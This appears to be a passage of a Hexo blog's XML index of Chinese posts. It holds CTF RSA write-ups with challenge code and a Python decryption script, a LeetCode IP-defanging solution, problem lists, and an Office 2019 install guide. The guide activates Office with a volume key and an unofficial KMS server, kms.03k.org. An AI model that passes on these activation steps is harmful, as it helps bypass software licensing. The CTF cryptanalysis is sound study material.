    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=1&amp;id=4981&amp;page=3">题目地址</a></p>
<p>题目名称：Handicraft_RSA</p>
<p>题目描述：</p>
<p>有人正在他老房子的地下室里开发自己的RSA系统。证明他这个RSA系统只在他的地下室有效。</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/f5346507773f4b909479387d59a01710">附件1</a></p>
<a id="more"></a>
<p>WriteUp</p>
<p><strong>解题过程：</strong></p>
<p>下载附件，先用010Editor打开查看16进制，也没看出是什么文件，也没有有含义的字符串</p>
<p>打开kaili虚拟机，用linux的file命令查看文件类型，发现是XZ压缩方式</p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014112757615.png" alt="image-20201014112757615"></p>
<p>也是第一次接触到xz压缩，百度搜索解压方式</p>
<p>1、首先使用xz解压文件</p>
<p>先给文件加上.xz后缀，否则会解压失败，然后加压</p>
<p>命令：<code>xz -d f5346507773f4b909479387d59a01710.xz</code></p>
<p>注：使用 xz 进行压缩和解压过程中都会直接在原文件上进行，比如说对 tar.xz 解压后直接就剩下 tar 了，而没有了原 tar.xz 文件。可以加 -k 参数（keep）进行保留原文件</p>
<p>xz解压后就变成了tar压缩文件，继续解压得到了handicraft_rsa文件夹</p>
<p>命令：<code>tar -xvf f5346507773f4b909479387d59a01710</code></p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014113556444.png" alt="image-20201014113556444"></p>
<p>2、拷贝到win10中接着进行分析</p>
<p>文件夹中有两个文件，output.txt文件是handicraft_rsa.py文件输出的结果</p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014113739458.png" alt="image-20201014113739458"></p>
<p>handicraft_rsa.py文件内容及分析过程如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> s, FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment">#题目所给的python文件使用的是python2，与python3语法、函数有些许不同</span></span><br><span class="line"><span class="comment">#得到一个1024bit的质数,不理解函数体也没关系，用于分析s的数值，大致猜出s不会太大</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="comment">#getPrime(s)返回一个随机N-Bit的质数</span></span><br><span class="line">        r = getPrime(s)</span><br><span class="line">        R = [r]</span><br><span class="line">        t = int(<span class="number">5</span> * s / <span class="number">2</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, t):</span><br><span class="line">			<span class="comment">#getRandomRange(a,b)函数得到一个在[a,b)之间的random</span></span><br><span class="line">            R.append(r + getRandomRange(<span class="number">0</span>, <span class="number">4</span> * s ** <span class="number">2</span>))</span><br><span class="line">		<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		lambda作为一个表达式，定义了一个匿名函数，a,b为函数传参，a*b为函数体</span></span><br><span class="line"><span class="string">		reduce(function,iterable[,initializer]) 函数会对参数序列中元素进行累积。</span></span><br><span class="line"><span class="string">		也就是对iterable可迭代对象（如列表、元组）中的第1、2个元素进行函数操作，</span></span><br><span class="line"><span class="string">		将得到的结果与第三个元素用function运算，最后得到一个结果，如果有init参数，</span></span><br><span class="line"><span class="string">		则先将init与第一个元素进行运算</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span></span><br><span class="line">        p = reduce(<span class="keyword">lambda</span> a, b: a * b, R, <span class="number">2</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">if</span> len(bin(p)[<span class="number">2</span>:]) == <span class="number">1024</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="comment">#循环，直到得到2048bit的n</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = gen_prime(s)</span><br><span class="line">    q = gen_prime(s)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = inverse(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    <span class="keyword">if</span> len(bin(n)[<span class="number">2</span>:]) == <span class="number">2048</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">msg = FLAG</span><br><span class="line">key = RSA.construct((long(n), long(e), long(d), long(p), long(p)))</span><br><span class="line"><span class="comment">#循环，加密s次</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(s):</span><br><span class="line">	<span class="comment">#RSA加密得到密文</span></span><br><span class="line">    enc = key.encrypt(msg, <span class="number">0</span>)[<span class="number">0</span>]</span><br><span class="line">    msg = enc</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印公钥文件</span></span><br><span class="line"><span class="keyword">print</span> key.publickey().exportKey()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;-&#x27;</span> * <span class="number">76</span></span><br><span class="line"><span class="comment">#密文用base64加密然后打印出来，这是python2的写法</span></span><br><span class="line"><span class="keyword">print</span> enc.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;-&#x27;</span> * <span class="number">76</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>output.txt文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ</span><br><span class="line">71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXs</span><br><span class="line">z9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsds</span><br><span class="line">etnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpD</span><br><span class="line">ffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+</span><br><span class="line">7&#x2F;i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAA</span><br><span class="line">AQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">eER0JNIcZYx&#x2F;t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL&#x2F;wnHtkAoNdCalQkpcbnZeAz4qeMX</span><br><span class="line">5GBmsO+BXyAKDueMA4uy3fw2k&#x2F;dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS4</span><br><span class="line">2o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI&#x2F;jUA2BEo5WBoPzsCzwRmdr6QmJXTsau</span><br><span class="line">5BAQC5qdIkmCNq7+NLY1fjOmSEF&#x2F;W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnX</span><br><span class="line">sh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上半部分是RSA加密公钥，下半部分是base64编码后的base64</p>
<p>接下来就简单了，把公钥信息保存成public.key文件，然后在kali虚拟机里用openssl工具解出e、n</p>
<p>命令：<code>openssl rsa -pubin -text -modulus -in warmup -in public.key</code></p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014114703386.png" alt="image-20201014114703386"></p>
<p>得到e、n，把n转成10进制然后在网站<a href="http://factordb.com/,解出p和q">http://factordb.com/,解出p和q</a></p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014115059462.png" alt="image-20201014115059462"></p>
<p>到此，已经获取到RSA的全部参数p、q、n、e</p>
<p>3、使用python3脚本解出明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">p=<span class="number">139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">q = <span class="number">155617827023249833340719354421664777126919280716316528121008762838820577123085292134385394346751341309377546683859340593439660968379640585296350265350950535158375685103003837903550191128377455111656903429282868722284520586387794090131818535032744071918282383650099890243578253423157468632973312000000000000001</span> </span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line"></span><br><span class="line">enc=<span class="string">&#x27;eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==&#x27;</span></span><br><span class="line">c=base64.b64decode(enc).hex()<span class="comment">#base64解码后是bytes类型，转成16进制字符串</span></span><br><span class="line"><span class="comment"># with open(r&quot;E:/flag.enc&quot; , &quot;rb&quot;) as f:</span></span><br><span class="line">    <span class="comment"># s=f.read().hex()#bytes转16进制字符串</span></span><br><span class="line">c=int(c,<span class="number">16</span>);<span class="comment">#密文，16进制转成int型</span></span><br><span class="line"><span class="comment">#这里不知道循环次数s的数值，不过根据分析s不会太大</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#解出明文</span></span><br><span class="line">    m=pow(c,d,n)<span class="comment">#得到的是10进制数据</span></span><br><span class="line">    c=m</span><br><span class="line">    hex_data=hex(m)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;666c&#x27;</span> <span class="keyword">in</span> hex_data:</span><br><span class="line">        print(hex_data)<span class="comment">#输出16进制数据</span></span><br><span class="line">        <span class="comment">#因为base16编码后的字母组成是[0-9A-F],所以要转成大写，否则会提示“Non-base16 digit found”</span></span><br><span class="line">        <span class="comment">#还可以写成flag=base64.b16decode(hex[2:],True)或者修改python库base64源码里的b16decode()函数第二个参数为True</span></span><br><span class="line">        flag=base64.b16decode(hex_data[<span class="number">2</span>:].upper())</span><br><span class="line">        print(flag)<span class="comment">#输出解码后的字符串</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>运行代码得到flag：ASIS{n0t_5O_e4sy<strong>_RSA_</strong>in_ASIS!!!}</p>
<p><img src="/2020/10/14/Handicraft-RSA/image-20201014120104049.png" alt="image-20201014120104049"></p>
<p>中间有的步骤还有其它方法</p>
<p>可以参考我的另一篇RSA WriteUp  <a href="https://z2bns.github.io/2020/10/10/RSA256/">RSA256</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>常规破解模数n</tag>
      </tags>
  </entry>
  <entry>
    <title>IP地址无效化</title>
    <url>/2020/11/07/IP%E5%9C%B0%E5%9D%80%E6%97%A0%E6%95%88%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/defanging-an-ip-address/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个有效的 IPv4 地址 <code>address</code>，返回这个 IP 地址的无效化版本。</p>
<p>所谓无效化 IP 地址，其实就是用 <code>&quot;[.]&quot;</code> 代替了每个~。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：address &#x3D; &quot;1.1.1.1&quot;</span><br><span class="line">输出：&quot;1[.]1[.]1[.]1&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：address &#x3D; &quot;255.100.50.0&quot;</span><br><span class="line">输出：&quot;255[.]100[.]50[.]0&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>给出的 <code>address</code> 是一个有效的 IPv4 地址</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>方法1：获取每个.之前的部分，转换后拼接到result中，在address中删掉转换后的这部分。</p>
<p>方法2：遍历address，对.元素进行替换处理</p>
<p><strong>c++代码1：</strong>(执行用时4ms，击败19.17%，内存消耗6.4M，击败5.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//.的位置</span></span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="comment">//存储最后结果</span></span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>((n=address.find(<span class="string">&#x27;.&#x27;</span>))!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">            <span class="comment">//获取.之前的子串并把.替换为[.]加到result中</span></span><br><span class="line">            result+=address.substr(<span class="number">0</span>,n+<span class="number">1</span>).replace(n,<span class="number">1</span>,<span class="string">&quot;[.]&quot;</span>);</span><br><span class="line">            address.erase(<span class="number">0</span>,n+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//加上最后一个.后的值</span></span><br><span class="line">        result+=address;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>c++代码2：</strong>（执行用时4ms，击败19.17%，内存消耗6.2M，击败5.33%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">defangIPaddr</span><span class="params">(<span class="built_in">string</span> address)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//遍历address，对.进行替换</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;address.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(address[i]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                address.replace(i,<span class="number">1</span>,<span class="string">&quot;[.]&quot;</span>);</span><br><span class="line">                i+=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><p>优先级：算术运算符 &gt; 关系运算符 &gt; 赋值运算</p>
<p><code>while((n=address.find(&#39;.&#39;))!=string::npos)</code>，前面n的复制运算要加上括号。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>只想着用STL 中string的方法了，其实方法二代码比较清晰简洁，做的时候感觉遍历效率不高，其实还行。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode问题</title>
    <url>/2020/11/24/LeetCode%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>记录一些LeetCode刷题时暂时未完全解决官方题解的题目，以便以后返回解决</p>
<a id="more"></a>
<p><a href="https://z2bns.github.io/2020/11/24/%E8%B7%9D%E7%A6%BB%E9%A1%BA%E5%BA%8F%E6%8E%92%E5%88%97%E7%9F%A9%E9%98%B5%E5%8D%95%E5%85%83%E6%A0%BC/">距离顺序排列矩阵单元格</a></p>
<p><a href>和为s的连续正数序列</a></p>
<p><a href>重复的子字符串</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode题目</title>
    <url>/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文给出了LeetCode上面一些题目，空闲时可以思考一下</p>
<a id="more"></a>
<p>1、<a href="https://leetcode-cn.com/problems/minimum-time-visiting-all-points/">访问所有点的最小时间</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113045478.png" alt="image-20201109113045478"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113054739.png" alt="image-20201109113054739"></p>
<p>2、<a href="https://leetcode-cn.com/problems/sum-of-all-odd-length-subarrays/">所有奇数长度子数组的和</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113109571.png" alt="image-20201109113109571"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113146870.png" alt="image-20201109113146870"></p>
<p>3、<a href="https://leetcode-cn.com/problems/check-array-formation-through-concatenation/">能否连接形成数组</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113205759.png" alt="image-20201109113205759"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113213446.png" alt="image-20201109113213446"></p>
<p>4、<a href="https://leetcode-cn.com/problems/find-numbers-with-even-number-of-digits/">统计位数为偶数的数字</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113226501.png" alt="image-20201109113226501"></p>
<p>5、<a href="https://leetcode-cn.com/problems/matrix-diagonal-sum/">矩阵对角线元素的和</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113241596.png" alt="image-20201109113241596"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109113250018.png" alt="image-20201109113250018"></p>
<p>6、<a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer/">1290. 二进制链表转整数</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153040964.png" alt="image-20201109153040964"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153048611.png" alt="image-20201109153048611"></p>
<p>7、<a href="https://leetcode-cn.com/problems/number-of-students-doing-homework-at-a-given-time/"> 在既定时间做作业的学生人数</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153157974.png" alt="image-20201109153157974"></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153205971.png" alt="image-20201109153205971"></p>
<p>8、<a href="https://leetcode-cn.com/problems/nGK0Fy/">速算机器人</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153222234.png" alt="image-20201109153222234"></p>
<p>9、<a href="https://leetcode-cn.com/problems/duplicate-emails/">查找重复的电子邮箱</a></p>
<p><img src="/2020/11/09/LeetCode%E9%A2%98%E7%9B%AE/image-20201109153241365.png" alt="image-20201109153241365"></p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
  </entry>
  <entry>
    <title>Office 专业增强版2019-批量版下载安装</title>
    <url>/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Office Tool Plus 是一个用于部署 Office, Visio 和 Project 的工具，支持 Office 2016、2019 和 365。借助 Office Tool Plus，你能很方便地部署 Office。</p>
<p>Office Tool Plus 基于微软的 <a href="https://docs.microsoft.com/en-us/DeployOffice/overview-of-the-office-2016-deployment-tool">Office 部署工具</a>和 <a href="https://docs.microsoft.com/en-us/DeployOffice/vlactivation/tools-to-manage-volume-activation-of-office">OSPP</a> 打造。</p>
<p><a href="https://otp.landian.vip/">Office Tool Plus 官方网站</a></p>
<p><a href="https://otp.landian.vip/download.html">Office Tool Plus 下载站</a></p>
<a id="more"></a>
<h6 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h6><p>Office Tool Plus 下载安装包可以在官网下载，也可以用我分享的安装程序</p>
<p>百度网盘下载链接：</p>
<p>链接：<a href="https://pan.baidu.com/s/102-U0p-sOW16TY-XtGyC_w">https://pan.baidu.com/s/102-U0p-sOW16TY-XtGyC_w</a><br>提取码：p1oc </p>
<h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><p>解压安装包，运行程序</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119222701548.png" alt="image-20201119222701548"></p>
<p>选择部署（注意需要联网）</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119222721511.png" alt="image-20201119222721511"></p>
<p>在部署页面勾选要安装的应用程序，在右侧安装设置中选择x64位体系结构，通道选择Office2019企业长期版，然后点击开始部署，然后等待安装完成就好了。</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119222818764.png" alt="image-20201119222818764"></p>
<h6 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h6><p>在软件安装主页面选择激活选项</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119223031679.png" alt="image-20201119223031679"></p>
<p>在激活页面配置如下</p>
<p>选择许可证“ProPlus2019Volume”——》安装许可证</p>
<p>密钥管理：NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP——》安装密钥</p>
<p>KMS管理：kms.03k.org——》应用服务器地址</p>
<p>点击“激活”</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119223726591.png" alt="image-20201119223726591"></p>
<p>随便到一个office应用程序里面查看，可以看到已经激活成功了</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119223812597.png" alt="image-20201119223812597"></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA_gcd</title>
    <url>/2020/10/13/RSA-gcd/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=1&amp;id=5452&amp;page=2">题目地址</a></p>
<p>题目名称：RSA_gcd</p>
<p>题目描述：暂无</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/f1217fd42e8b43558077180e98c757d7.zip">附件1</a></p>
<a id="more"></a>
<p><strong>解题思路：</strong></p>
<p>下载附件，解压得到两个文件</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013093744652.png" alt="image-20201013093744652"></p>
<p>文件内容如下：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013093813299.png" alt="image-20201013093813299"></p>
<p>给出了模数n、公钥指数e、密文c，就是常规的RSA解密，属于常规破解模数，直接用脚本解密就好了。</p>
<p><strong>解题过程：</strong></p>
<p>登录网站<a href="http://factordb.com/,分别解出p和q，如下">http://factordb.com/,分别解出p和q，如下</a></p>
<p>attach1.txt：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013094252764.png" alt="image-20201013094252764"></p>
<p>attach2.txt：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013094215298.png" alt="image-20201013094215298"></p>
<p>python3脚本解密：</p>
